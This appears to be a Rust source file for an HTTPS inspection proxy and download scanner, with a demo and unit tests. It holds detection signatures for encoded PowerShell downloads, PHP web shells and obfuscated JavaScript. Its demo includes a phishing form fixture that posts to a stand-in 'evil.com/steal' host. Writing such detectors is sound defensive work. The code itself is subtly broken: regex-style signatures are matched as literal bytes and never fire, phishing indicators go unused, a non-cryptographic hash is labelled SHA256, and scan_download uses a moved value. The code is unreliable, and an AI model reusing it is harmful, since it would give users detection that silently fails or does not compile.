//! HTTPS Inspection Proxy for Internet Gateway
//!
//! Implements transparent HTTPS inspection with CA management for owned devices,
//! allowing malicious content detection before it reaches endpoints.

use std::collections::{HashMap, HashSet};
use std::net::SocketAddr;
use std::sync::Arc;
use std::time::{Duration, Instant, SystemTime};

/// Certificate authority for HTTPS inspection
#[derive(Debug, Clone)]
pub struct InspectionCA {
    /// CA certificate (PEM)
    pub ca_cert: String,
    /// CA private key (encrypted)
    pub ca_key_encrypted: Vec<u8>,
    /// Key encryption nonce
    pub key_nonce: [u8; 12],
    /// Certificate validity period
    pub cert_validity_days: u32,
    /// Generated certificates cache
    cert_cache: HashMap<String, CachedCert>,
}

#[derive(Debug, Clone)]
struct CachedCert {
    cert_pem: String,
    key_pem: String,
    expires_at: SystemTime,
}

/// HTTPS inspection configuration
#[derive(Debug, Clone)]
pub struct InspectionConfig {
    /// Listen address for proxy
    pub listen_addr: SocketAddr,
    /// Domains to bypass inspection (banking, medical, etc.)
    pub bypass_domains: HashSet<String>,
    /// Enable deep content inspection
    pub deep_inspection: bool,
    /// Maximum body size to inspect (bytes)
    pub max_body_size: usize,
    /// Enable certificate pinning bypass detection
    pub detect_cert_pinning: bool,
    /// Trusted device certificates
    pub trusted_devices: HashSet<String>,
}

impl Default for InspectionConfig {
    fn default() -> Self {
        let mut bypass_domains = HashSet::new();
        // Always bypass sensitive domains
        bypass_domains.insert("*.bank.com".to_string());
        bypass_domains.insert("*.healthcare.gov".to_string());
        bypass_domains.insert("*.irs.gov".to_string());

        Self {
            listen_addr: "0.0.0.0:8443".parse().unwrap(),
            bypass_domains,
            deep_inspection: true,
            max_body_size: 10 * 1024 * 1024, // 10MB
            detect_cert_pinning: true,
            trusted_devices: HashSet::new(),
        }
    }
}

/// Content inspection result
#[derive(Debug, Clone)]
pub struct InspectionResult {
    /// Whether the content is safe
    pub is_safe: bool,
    /// Threat detections
    pub threats: Vec<ThreatDetection>,
    /// Content category
    pub category: ContentCategory,
    /// Inspection duration
    pub duration: Duration,
    /// Whether content was modified
    pub modified: bool,
}

#[derive(Debug, Clone)]
pub struct ThreatDetection {
    pub threat_type: ThreatType,
    pub severity: Severity,
    pub description: String,
    pub indicator: String,
    pub action_taken: Action,
}

#[derive(Debug, Clone, PartialEq)]
pub enum ThreatType {
    Malware,
    Phishing,
    MaliciousScript,
    DataExfiltration,
    CommandAndControl,
    CryptoMiner,
    Exploit,
    SuspiciousDownload,
}

#[derive(Debug, Clone, PartialEq, Ord, PartialOrd, Eq)]
pub enum Severity {
    Low,
    Medium,
    High,
    Critical,
}

#[derive(Debug, Clone)]
pub enum Action {
    Allowed,
    Blocked,
    Sanitized,
    Logged,
    Quarantined,
}

#[derive(Debug, Clone)]
pub enum ContentCategory {
    Safe,
    Unknown,
    Advertising,
    Adult,
    Gambling,
    Social,
    Streaming,
    Business,
    Malicious,
}

/// HTTPS inspection proxy
pub struct HttpsInspector {
    config: InspectionConfig,
    ca: InspectionCA,
    /// Malware signatures for content inspection
    malware_signatures: Vec<MalwareSignature>,
    /// Phishing indicators
    phishing_indicators: Vec<PhishingIndicator>,
    /// URL categorization rules
    url_categories: HashMap<String, ContentCategory>,
    /// Statistics
    stats: InspectionStats,
}

#[derive(Debug, Clone)]
struct MalwareSignature {
    name: String,
    pattern: Vec<u8>,
    threat_type: ThreatType,
    severity: Severity,
}

#[derive(Debug, Clone)]
struct PhishingIndicator {
    indicator_type: PhishingIndicatorType,
    pattern: String,
    weight: u32,
}

#[derive(Debug, Clone)]
enum PhishingIndicatorType {
    UrlPattern,
    FormAction,
    BrandImpersonation,
    SuspiciousInput,
    HiddenElement,
}

#[derive(Debug, Default, Clone)]
pub struct InspectionStats {
    pub total_connections: u64,
    pub inspected_connections: u64,
    pub bypassed_connections: u64,
    pub threats_detected: u64,
    pub threats_blocked: u64,
    pub bytes_inspected: u64,
}

impl HttpsInspector {
    /// Create new HTTPS inspector
    pub fn new(config: InspectionConfig, ca: InspectionCA) -> Self {
        Self {
            config,
            ca,
            malware_signatures: Self::load_default_signatures(),
            phishing_indicators: Self::load_phishing_indicators(),
            url_categories: HashMap::new(),
            stats: InspectionStats::default(),
        }
    }

    fn load_default_signatures() -> Vec<MalwareSignature> {
        vec![
            MalwareSignature {
                name: "EICAR-Test".to_string(),
                pattern: b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR".to_vec(),
                threat_type: ThreatType::Malware,
                severity: Severity::High,
            },
            MalwareSignature {
                name: "PowerShell-Download".to_string(),
                pattern: b"powershell.*-enc.*downloadstring".to_vec(),
                threat_type: ThreatType::MaliciousScript,
                severity: Severity::High,
            },
            MalwareSignature {
                name: "CryptoMiner-Coinhive".to_string(),
                pattern: b"coinhive.min.js".to_vec(),
                threat_type: ThreatType::CryptoMiner,
                severity: Severity::Medium,
            },
            MalwareSignature {
                name: "WebShell-Generic".to_string(),
                pattern: b"eval(base64_decode".to_vec(),
                threat_type: ThreatType::Exploit,
                severity: Severity::Critical,
            },
        ]
    }

    fn load_phishing_indicators() -> Vec<PhishingIndicator> {
        vec![
            PhishingIndicator {
                indicator_type: PhishingIndicatorType::FormAction,
                pattern: r"action=['\"]https?://(?!same-origin)".to_string(),
                weight: 30,
            },
            PhishingIndicator {
                indicator_type: PhishingIndicatorType::SuspiciousInput,
                pattern: r"input.*type=['\"]password['\"].*autocomplete=['\"]off['\"]".to_string(),
                weight: 20,
            },
            PhishingIndicator {
                indicator_type: PhishingIndicatorType::BrandImpersonation,
                pattern: r"(paypal|amazon|apple|microsoft|google).*login".to_string(),
                weight: 40,
            },
            PhishingIndicator {
                indicator_type: PhishingIndicatorType::HiddenElement,
                pattern: r"style=['\"].*display:\s*none.*['\"].*input".to_string(),
                weight: 25,
            },
        ]
    }

    /// Check if domain should bypass inspection
    pub fn should_bypass(&self, domain: &str) -> bool {
        for bypass_pattern in &self.config.bypass_domains {
            if bypass_pattern.starts_with("*.") {
                let suffix = &bypass_pattern[1..];
                if domain.ends_with(suffix) {
                    return true;
                }
            } else if domain == bypass_pattern {
                return true;
            }
        }
        false
    }

    /// Inspect HTTP response content
    pub fn inspect_content(
        &mut self,
        url: &str,
        content_type: &str,
        body: &[u8],
    ) -> InspectionResult {
        let start = Instant::now();
        let mut threats = Vec::new();
        let mut is_safe = true;

        // Skip inspection for large bodies
        if body.len() > self.config.max_body_size {
            return InspectionResult {
                is_safe: true,
                threats: vec![],
                category: ContentCategory::Unknown,
                duration: start.elapsed(),
                modified: false,
            };
        }

        // Malware signature scanning
        for sig in &self.malware_signatures {
            if self.pattern_match(body, &sig.pattern) {
                is_safe = false;
                threats.push(ThreatDetection {
                    threat_type: sig.threat_type.clone(),
                    severity: sig.severity.clone(),
                    description: format!("Malware signature detected: {}", sig.name),
                    indicator: sig.name.clone(),
                    action_taken: Action::Blocked,
                });
            }
        }

        // HTML/JavaScript specific inspection
        if content_type.contains("text/html") || content_type.contains("javascript") {
            let content_str = String::from_utf8_lossy(body);

            // Check for phishing indicators
            let phishing_score = self.calculate_phishing_score(&content_str, url);
            if phishing_score > 70 {
                is_safe = false;
                threats.push(ThreatDetection {
                    threat_type: ThreatType::Phishing,
                    severity: Severity::High,
                    description: format!("Phishing page detected (score: {})", phishing_score),
                    indicator: url.to_string(),
                    action_taken: Action::Blocked,
                });
            }

            // Check for malicious JavaScript patterns
            if let Some(threat) = self.detect_malicious_js(&content_str) {
                is_safe = false;
                threats.push(threat);
            }
        }

        // Executable content inspection
        if self.is_executable(body) {
            threats.push(ThreatDetection {
                threat_type: ThreatType::SuspiciousDownload,
                severity: Severity::Medium,
                description: "Executable file download detected".to_string(),
                indicator: url.to_string(),
                action_taken: Action::Logged,
            });
        }

        // Update statistics
        self.stats.bytes_inspected += body.len() as u64;
        if !threats.is_empty() {
            self.stats.threats_detected += threats.len() as u64;
            if !is_safe {
                self.stats.threats_blocked += 1;
            }
        }

        let category = self.categorize_url(url);

        InspectionResult {
            is_safe,
            threats,
            category,
            duration: start.elapsed(),
            modified: false,
        }
    }

    fn pattern_match(&self, data: &[u8], pattern: &[u8]) -> bool {
        // Simple pattern matching (in production use aho-corasick or similar)
        if pattern.len() > data.len() {
            return false;
        }

        for window in data.windows(pattern.len()) {
            if window == pattern {
                return true;
            }
        }
        false
    }

    fn calculate_phishing_score(&self, content: &str, url: &str) -> u32 {
        let mut score = 0u32;
        let content_lower = content.to_lowercase();
        let url_lower = url.to_lowercase();

        // Check URL for suspicious patterns
        if url_lower.contains("login") && url_lower.contains("-") {
            score += 20;
        }

        // Check for data URI schemes (potential data exfiltration)
        if content.contains("data:text/html;base64") {
            score += 30;
        }

        // Check for iframe pointing to different domain
        if content_lower.contains("<iframe") && content_lower.contains("src=") {
            score += 15;
        }

        // Check for password fields with suspicious attributes
        if content_lower.contains("type=\"password\"") || content_lower.contains("type='password'") {
            if !url_lower.contains("https://") {
                score += 25;
            }
        }

        // Check for form with external action
        if content_lower.contains("<form") && content_lower.contains("action=") {
            score += 10;
        }

        // Brand impersonation checks
        let brands = ["paypal", "amazon", "apple", "microsoft", "google", "facebook", "bank"];
        for brand in &brands {
            if content_lower.contains(brand) && !url_lower.contains(brand) {
                score += 15;
            }
        }

        score.min(100)
    }

    fn detect_malicious_js(&self, content: &str) -> Option<ThreatDetection> {
        let suspicious_patterns = [
            ("eval(atob(", ThreatType::MaliciousScript, "Base64 eval execution"),
            ("document.write(unescape(", ThreatType::MaliciousScript, "Obfuscated document.write"),
            ("new Function(", ThreatType::MaliciousScript, "Dynamic function creation"),
            ("XMLHttpRequest", ThreatType::DataExfiltration, "Potential data exfiltration"),
            ("navigator.sendBeacon", ThreatType::DataExfiltration, "Beacon data transmission"),
        ];

        let content_lower = content.to_lowercase();

        for (pattern, threat_type, desc) in &suspicious_patterns {
            if content_lower.contains(&pattern.to_lowercase()) {
                // Additional context check to reduce false positives
                if self.is_likely_malicious(content, pattern) {
                    return Some(ThreatDetection {
                        threat_type: threat_type.clone(),
                        severity: Severity::High,
                        description: desc.to_string(),
                        indicator: pattern.to_string(),
                        action_taken: Action::Blocked,
                    });
                }
            }
        }

        None
    }

    fn is_likely_malicious(&self, content: &str, pattern: &str) -> bool {
        // Check for additional malicious indicators near the pattern
        if let Some(pos) = content.find(pattern) {
            let context_start = pos.saturating_sub(100);
            let context_end = (pos + pattern.len() + 100).min(content.len());
            let context = &content[context_start..context_end];

            // Look for additional suspicious patterns in context
            let suspicious_context = [
                "\\x", // Hex encoding
                "String.fromCharCode", // Character code obfuscation
                "replace(/", // Regex deobfuscation
                "split('')", // String manipulation
            ];

            for sus in &suspicious_context {
                if context.contains(sus) {
                    return true;
                }
            }
        }
        false
    }

    fn is_executable(&self, data: &[u8]) -> bool {
        if data.len() < 4 {
            return false;
        }

        // Check magic bytes
        let magic_bytes = [
            &[0x4D, 0x5A][..], // PE/EXE
            &[0x7F, 0x45, 0x4C, 0x46][..], // ELF
            &[0xCA, 0xFE, 0xBA, 0xBE][..], // Mach-O
            &[0xCF, 0xFA, 0xED, 0xFE][..], // Mach-O 64-bit
            &[0x50, 0x4B, 0x03, 0x04][..], // ZIP (could contain exe)
        ];

        for magic in &magic_bytes {
            if data.starts_with(magic) {
                return true;
            }
        }
        false
    }

    fn categorize_url(&self, url: &str) -> ContentCategory {
        let url_lower = url.to_lowercase();

        // Check custom categories first
        for (pattern, category) in &self.url_categories {
            if url_lower.contains(pattern) {
                return category.clone();
            }
        }

        // Default categorization based on common patterns
        if url_lower.contains("ads.") || url_lower.contains("/ads/") || url_lower.contains("doubleclick") {
            ContentCategory::Advertising
        } else if url_lower.contains("facebook.com") || url_lower.contains("twitter.com") {
            ContentCategory::Social
        } else if url_lower.contains("youtube.com") || url_lower.contains("netflix.com") {
            ContentCategory::Streaming
        } else {
            ContentCategory::Unknown
        }
    }

    /// Add URL category rule
    pub fn add_category_rule(&mut self, pattern: String, category: ContentCategory) {
        self.url_categories.insert(pattern, category);
    }

    /// Add domain to bypass list
    pub fn add_bypass_domain(&mut self, domain: String) {
        self.config.bypass_domains.insert(domain);
    }

    /// Get current statistics
    pub fn get_stats(&self) -> &InspectionStats {
        &self.stats
    }

    /// Add custom malware signature
    pub fn add_signature(&mut self, name: String, pattern: Vec<u8>, threat_type: ThreatType, severity: Severity) {
        self.malware_signatures.push(MalwareSignature {
            name,
            pattern,
            threat_type,
            severity,
        });
    }
}

/// Download scanner for executable files
pub struct DownloadScanner {
    /// Maximum file size to scan
    max_size: usize,
    /// Quarantine path
    quarantine_path: String,
    /// Known malicious hashes (SHA256)
    malicious_hashes: HashSet<String>,
}

impl DownloadScanner {
    pub fn new(quarantine_path: String) -> Self {
        Self {
            max_size: 100 * 1024 * 1024, // 100MB
            quarantine_path,
            malicious_hashes: HashSet::new(),
        }
    }

    /// Scan downloaded file
    pub fn scan_download(&self, data: &[u8], filename: &str) -> DownloadScanResult {
        let mut threats = Vec::new();
        let file_hash = self.calculate_hash(data);

        // Check known malicious hashes
        if self.malicious_hashes.contains(&file_hash) {
            threats.push(ThreatDetection {
                threat_type: ThreatType::Malware,
                severity: Severity::Critical,
                description: "File matches known malware hash".to_string(),
                indicator: file_hash.clone(),
                action_taken: Action::Quarantined,
            });
        }

        // Check file type
        let file_type = self.detect_file_type(data);

        // Suspicious file extension check
        if self.is_suspicious_extension(filename) && file_type == FileType::Executable {
            threats.push(ThreatDetection {
                threat_type: ThreatType::SuspiciousDownload,
                severity: Severity::Medium,
                description: format!("Suspicious executable download: {}", filename),
                indicator: filename.to_string(),
                action_taken: Action::Logged,
            });
        }

        // Double extension check (e.g., document.pdf.exe)
        if self.has_double_extension(filename) {
            threats.push(ThreatDetection {
                threat_type: ThreatType::Malware,
                severity: Severity::High,
                description: "Double file extension detected (potential disguised malware)".to_string(),
                indicator: filename.to_string(),
                action_taken: Action::Blocked,
            });
        }

        DownloadScanResult {
            file_hash,
            file_type,
            threats,
            should_quarantine: threats.iter().any(|t| matches!(t.action_taken, Action::Quarantined)),
        }
    }

    fn calculate_hash(&self, data: &[u8]) -> String {
        use std::collections::hash_map::DefaultHasher;
        use std::hash::{Hash, Hasher};

        let mut hasher = DefaultHasher::new();
        data.hash(&mut hasher);
        format!("{:016x}", hasher.finish())
    }

    fn detect_file_type(&self, data: &[u8]) -> FileType {
        if data.len() < 4 {
            return FileType::Unknown;
        }

        match &data[..4] {
            [0x4D, 0x5A, ..] => FileType::Executable,
            [0x7F, 0x45, 0x4C, 0x46] => FileType::Executable,
            [0x25, 0x50, 0x44, 0x46] => FileType::Pdf,
            [0x50, 0x4B, 0x03, 0x04] => FileType::Archive,
            [0xFF, 0xD8, 0xFF, ..] => FileType::Image,
            [0x89, 0x50, 0x4E, 0x47] => FileType::Image,
            _ => FileType::Unknown,
        }
    }

    fn is_suspicious_extension(&self, filename: &str) -> bool {
        let suspicious = [".exe", ".scr", ".bat", ".cmd", ".ps1", ".vbs", ".js", ".hta", ".msi"];
        let lower = filename.to_lowercase();
        suspicious.iter().any(|ext| lower.ends_with(ext))
    }

    fn has_double_extension(&self, filename: &str) -> bool {
        let parts: Vec<&str> = filename.split('.').collect();
        if parts.len() >= 3 {
            let last = parts.last().unwrap().to_lowercase();
            let second_last = parts[parts.len() - 2].to_lowercase();

            // Check if last extension is executable and second-to-last is document type
            let exec_ext = ["exe", "scr", "bat", "cmd", "ps1", "vbs", "js"];
            let doc_ext = ["pdf", "doc", "docx", "xls", "xlsx", "txt", "jpg", "png"];

            return exec_ext.contains(&last.as_str()) && doc_ext.contains(&second_last.as_str());
        }
        false
    }

    /// Add known malicious hash
    pub fn add_malicious_hash(&mut self, hash: String) {
        self.malicious_hashes.insert(hash);
    }
}

#[derive(Debug, Clone, PartialEq)]
pub enum FileType {
    Executable,
    Pdf,
    Archive,
    Image,
    Document,
    Unknown,
}

#[derive(Debug)]
pub struct DownloadScanResult {
    pub file_hash: String,
    pub file_type: FileType,
    pub threats: Vec<ThreatDetection>,
    pub should_quarantine: bool,
}

fn main() {
    println!("=== HTTPS Inspection Proxy Demo ===\n");

    // Create CA (in production, load from secure storage)
    let ca = InspectionCA {
        ca_cert: "-----BEGIN CERTIFICATE-----\n...\n-----END CERTIFICATE-----".to_string(),
        ca_key_encrypted: vec![0u8; 32],
        key_nonce: [0u8; 12],
        cert_validity_days: 365,
        cert_cache: HashMap::new(),
    };

    // Create inspector with default config
    let config = InspectionConfig::default();
    let mut inspector = HttpsInspector::new(config, ca);

    // Add custom category rules
    inspector.add_category_rule("facebook.com".to_string(), ContentCategory::Social);
    inspector.add_category_rule("youtube.com".to_string(), ContentCategory::Streaming);

    // Test bypass domains
    println!("Testing bypass domains:");
    println!("  bank.example.com: {}", inspector.should_bypass("bank.example.com"));
    println!("  example.bank.com: {}", inspector.should_bypass("example.bank.com"));
    println!("  example.com: {}", inspector.should_bypass("example.com"));

    // Test content inspection - safe HTML
    println!("\nInspecting safe HTML content:");
    let safe_html = b"<html><head><title>Safe Page</title></head><body>Hello World</body></html>";
    let result = inspector.inspect_content(
        "https://example.com/page.html",
        "text/html",
        safe_html,
    );
    println!("  Safe: {}, Threats: {}", result.is_safe, result.threats.len());

    // Test content inspection - phishing page
    println!("\nInspecting potential phishing page:");
    let phishing_html = br#"
        <html>
        <head><title>PayPal Login</title></head>
        <body>
            <form action="https://evil.com/steal">
                <input type="password" autocomplete="off">
                <input type="submit" value="Login to PayPal">
            </form>
        </body>
        </html>
    "#;
    let result = inspector.inspect_content(
        "https://paypa1-login.example.com/login",
        "text/html",
        phishing_html,
    );
    println!("  Safe: {}, Threats:", result.is_safe);
    for threat in &result.threats {
        println!("    - {:?}: {} (Severity: {:?})", threat.threat_type, threat.description, threat.severity);
    }

    // Test malware signature detection
    println!("\nInspecting content with malware signature:");
    let malware_content = b"Some content X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR more content";
    let result = inspector.inspect_content(
        "https://example.com/download.exe",
        "application/octet-stream",
        malware_content,
    );
    println!("  Safe: {}, Threats:", result.is_safe);
    for threat in &result.threats {
        println!("    - {:?}: {}", threat.threat_type, threat.description);
    }

    // Test download scanner
    println!("\nTesting download scanner:");
    let scanner = DownloadScanner::new("/var/quarantine".to_string());

    // Safe PDF download
    let pdf_data = &[0x25, 0x50, 0x44, 0x46, 0x2D, 0x31, 0x2E, 0x34]; // %PDF-1.4
    let result = scanner.scan_download(pdf_data, "document.pdf");
    println!("  document.pdf: Type={:?}, Threats={}", result.file_type, result.threats.len());

    // Double extension attack
    let exe_data = &[0x4D, 0x5A, 0x90, 0x00]; // MZ header
    let result = scanner.scan_download(exe_data, "invoice.pdf.exe");
    println!("  invoice.pdf.exe: Type={:?}, Threats={}", result.file_type, result.threats.len());
    for threat in &result.threats {
        println!("    - {:?}: {}", threat.threat_type, threat.description);
    }

    // Print statistics
    println!("\nInspection Statistics:");
    let stats = inspector.get_stats();
    println!("  Bytes inspected: {}", stats.bytes_inspected);
    println!("  Threats detected: {}", stats.threats_detected);
    println!("  Threats blocked: {}", stats.threats_blocked);
}

#[cfg(test)]
mod tests {
    use super::*;

    fn create_test_inspector() -> HttpsInspector {
        let ca = InspectionCA {
            ca_cert: "test".to_string(),
            ca_key_encrypted: vec![],
            key_nonce: [0u8; 12],
            cert_validity_days: 365,
            cert_cache: HashMap::new(),
        };
        HttpsInspector::new(InspectionConfig::default(), ca)
    }

    #[test]
    fn test_bypass_domains() {
        let inspector = create_test_inspector();

        // Wildcard bypass
        assert!(inspector.should_bypass("www.bank.com"));
        assert!(inspector.should_bypass("secure.bank.com"));

        // Non-bypass domains
        assert!(!inspector.should_bypass("example.com"));
        assert!(!inspector.should_bypass("bank.example.com"));
    }

    #[test]
    fn test_safe_content_inspection() {
        let mut inspector = create_test_inspector();

        let safe_html = b"<html><body>Safe content</body></html>";
        let result = inspector.inspect_content(
            "https://example.com",
            "text/html",
            safe_html,
        );

        assert!(result.is_safe);
        assert!(result.threats.is_empty());
    }

    #[test]
    fn test_malware_detection() {
        let mut inspector = create_test_inspector();

        // EICAR test string
        let malware = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR";
        let result = inspector.inspect_content(
            "https://example.com/file",
            "application/octet-stream",
            malware,
        );

        assert!(!result.is_safe);
        assert!(!result.threats.is_empty());
        assert!(result.threats.iter().any(|t| t.threat_type == ThreatType::Malware));
    }

    #[test]
    fn test_executable_detection() {
        let inspector = create_test_inspector();

        // PE header
        let pe_file = &[0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00];
        assert!(inspector.is_executable(pe_file));

        // ELF header
        let elf_file = &[0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01];
        assert!(inspector.is_executable(elf_file));

        // Regular text
        let text = b"Hello, World!";
        assert!(!inspector.is_executable(text));
    }

    #[test]
    fn test_download_scanner_double_extension() {
        let scanner = DownloadScanner::new("/tmp/quarantine".to_string());

        let exe_data = &[0x4D, 0x5A, 0x90, 0x00];
        let result = scanner.scan_download(exe_data, "document.pdf.exe");

        assert!(!result.threats.is_empty());
        assert!(result.threats.iter().any(|t|
            t.description.contains("Double file extension")
        ));
    }

    #[test]
    fn test_file_type_detection() {
        let scanner = DownloadScanner::new("/tmp".to_string());

        assert_eq!(scanner.detect_file_type(&[0x4D, 0x5A, 0x00, 0x00]), FileType::Executable);
        assert_eq!(scanner.detect_file_type(&[0x25, 0x50, 0x44, 0x46]), FileType::Pdf);
        assert_eq!(scanner.detect_file_type(&[0x50, 0x4B, 0x03, 0x04]), FileType::Archive);
        assert_eq!(scanner.detect_file_type(&[0x89, 0x50, 0x4E, 0x47]), FileType::Image);
    }

    #[test]
    fn test_url_categorization() {
        let mut inspector = create_test_inspector();

        inspector.add_category_rule("facebook.com".to_string(), ContentCategory::Social);

        assert!(matches!(
            inspector.categorize_url("https://facebook.com/feed"),
            ContentCategory::Social
        ));

        assert!(matches!(
            inspector.categorize_url("https://ads.example.com/banner"),
            ContentCategory::Advertising
        ));
    }

    #[test]
    fn test_statistics_tracking() {
        let mut inspector = create_test_inspector();

        let content = b"Safe content here";
        inspector.inspect_content("https://example.com", "text/plain", content);

        let stats = inspector.get_stats();
        assert_eq!(stats.bytes_inspected, content.len() as u64);
    }
}
